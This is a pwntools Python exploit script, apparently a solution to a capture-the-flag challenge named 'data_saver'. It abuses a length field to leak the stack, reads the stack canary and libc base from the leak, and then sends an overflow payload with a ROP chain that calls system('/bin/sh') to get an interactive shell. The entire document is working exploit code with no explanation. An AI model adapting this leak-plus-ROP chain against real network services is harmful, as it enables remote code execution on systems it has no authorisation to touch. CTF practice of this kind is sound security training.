#!/usr/bin/env python3

from pwn import *

libc = ELF('./libc.so.6')
if args['REMOTE']:
    target = remote('data-saver-ab940d1f1cdf.tcp.1753ctf.com', 14980)
elif args['DBG']:
    target = gdb.debug('./data_saver_patched',
    '''
break main
layout asm
conti
    ''')
else:
    target = process('./data_saver_patched')

def p16n(val):
    return p16(val, endian='big')

HEADER_LEN = 16

def make_msg(cmd, data, length):
    header = p8(0) + p8(cmd) + p16n(length) + b'\xdd' * (HEADER_LEN-4)
    return header + data

OP_PING = 0
OP_SAVE = 1

target.send(make_msg(OP_PING, b'', 0))

header = target.readn(HEADER_LEN)
stack = target.readn(0x10000)

canary = u64(stack[0x5d8:0x5e0])
canary1 = u64(stack[0x678:0x680])
assert canary == canary1

log.info(f'canary: {hex(canary)}')

libc_init_first_exit = u64(stack[0x5e8:0x5f0])
libc.address = libc_init_first_exit - 0x2724a
log.info(f'canary: {hex(libc.address)}')

POP_RDI_ADDR = libc.address + 0x277e5
RET_ADDR = libc.address + 0x277e6
BIN_SH_ADDR = next(libc.search(b'/bin/sh'))

rop = (p64(POP_RDI_ADDR) + p64(BIN_SH_ADDR)
    + p64(RET_ADDR)
    + p64(libc.symbols['system']))

payload = p64(0)*65 + p64(canary) + p64(0) + rop
# without sleep remote might read too much
sleep(0.5)
target.send(make_msg(OP_SAVE, payload, 0))

target.interactive()
